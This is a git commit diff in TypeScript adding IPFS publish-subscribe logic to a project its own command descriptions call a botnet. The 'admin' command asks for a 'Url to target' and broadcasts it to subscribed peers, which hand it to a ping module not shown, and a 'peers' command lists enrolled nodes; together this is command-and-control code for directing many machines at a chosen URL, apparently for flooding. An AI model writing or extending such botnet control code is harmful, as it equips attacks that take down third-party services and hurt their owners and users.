b438bb1a936027b1cb0919522fe4d9be28ef166b
Aitor Ruiz <aitorruiz2m@gmail.com>
2022-04-19 19:54:32 +0200

    :sparkles: ipfs sub, send and list

--- src/index.ts
+++ src/index.ts
@@ -1,19 +1,31 @@
 // TODO: Call pbLogic with the topic.
 import args from 'args';
+import pbL, { list_peers, send_next_target } from './pbLogic';
 const TOPIC = 'btnt-ipfs';
+import readline from 'readline';
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
 console.log(TOPIC);
 
 const serveCommand = async () => {
-  console.log('Serve called');
+  await pbL(TOPIC);
 };
 
 const adminCommand = async () => {
-  console.log('admin called');
+  rl.question('Url to target: ', async (url) => {
+    await send_next_target(TOPIC, url);
+  });
+};
+const listPeers = async () => {
+  await list_peers(TOPIC);
 };
 
 args
   .command('serve', 'Serve the botnet', serveCommand)
-  .command('admin', 'Send messages to the pubsub botnet', adminCommand);
+  .command('admin', 'Send messages to the pubsub botnet', adminCommand)
+  .command('peers', 'List the peers that are subscribed to the topic', listPeers);
 
 // Parse cli args 
 args.parse(process.argv);
--- src/pbLogic.ts
+++ src/pbLogic.ts
@@ -1,6 +1,48 @@
-// Default export. Logic goes here.
+import * as IPFS from 'ipfs-core';
+import pingL from './pingLogic';
+
+/**
+ * Listener logic
+ * @param topic The topic where the messages will be recived
+ */
 export default async function pbL(topic: string) {
-  // TODO: implement logic.
-  // TODO: call pingLogic with the url of choice.
-  console.log(topic);
+  const ipfs = await create_IPFS();
+  const receiveMsg = (msg: { data: BufferSource | undefined; }) => pingL(new TextDecoder().decode(msg.data));
+  await ipfs.pubsub.subscribe(topic, receiveMsg);
 }
+
+/**
+ * Send a url to the botnet
+ * @param topic The topic witch the message will be sent to
+ * @param payload The payload that will get sent
+ */
+const send_next_target = async (topic:string, payload:string) => {
+  const ipfs = await create_IPFS();
+  const msg = new TextEncoder().encode(payload);
+  await ipfs.pubsub.publish(topic, msg);
+};
+
+/**
+ * List all peers subscribed to a topic
+ * @param topic The topic from witch the peers will be taken
+ */
+const list_peers = async (topic:string) => {
+  const ipfs = await create_IPFS();
+  const peerIds = await ipfs.pubsub.peers(topic);
+  console.log(peerIds);
+};
+
+/**
+ * Creates a IPFS instance
+ * @returns ipfs instance
+ */
+const create_IPFS = async () => {
+  const ipfs = await IPFS.create();
+  return ipfs;
+};
+
+// Other exports
+export {
+  send_next_target,
+  list_peers,
+};
